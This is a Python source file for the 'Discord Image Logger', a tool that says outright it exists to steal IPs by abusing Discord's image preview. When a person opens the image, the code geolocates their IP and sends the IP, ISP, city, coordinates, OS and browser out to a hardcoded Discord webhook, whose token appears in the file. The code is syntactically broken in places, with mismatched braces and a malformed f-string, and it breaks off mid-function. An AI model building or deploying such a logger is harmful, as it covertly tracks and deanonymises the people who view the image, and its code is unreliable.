import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

# إعدادات التطبيق
config = {
    "webhook": "https://discord.com/api/webhooks/1367441811920126033/RZh4nmxwd-wa5uflYh03hkIHoCjdrKEKL-e3xzzNZQIERZydwVEU7nE8GfisOJkYUJbu",
    "image": "https://images.sftcdn.net/images/t_app-cover-m,f_auto/p/9848e854-ffae-11e6-a59d-00163ed833e7/3489861693/discord-screenshot.png",  # يمكنك تعديل الصورة هنا
    "imageArgument": True,  # يسمح لك بتغيير الصورة من خلال رابط
    "username": "Image Logger",  # اسم المستخدم الذي سيظهر في الـ webhook
    "color": 0x00FFFF,  # اللون الذي سيظهر في الـ embed
    # باقي الإعدادات
}

blacklistedIPs = ("27", "104", "143", "164")  # قائمة IPs محظورة (اختياري)

# التحقق من الـ IP إذا كان بوت أو لا
def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

# إضافة تقرير عند حدوث خطأ
def reportError(error):
    requests.post(config["webhook"], json = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
            }
        ],
    })

# إضافة تقرير عند فتح الصورة
def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    bot = botCheck(ip, useragent)
    if bot:
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [
            }
                "title": "Image Logger - IP Logged",
                "color": config["color"],
                "description": f""**A User Opened the Original Image!**

**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}`

**PC Info:**
> **OS:** `{httpagentparser.simple_detect(useragent)[0]}`
> **Browser:** `{httpagentparser.simple_detect(useragent)[1]}`
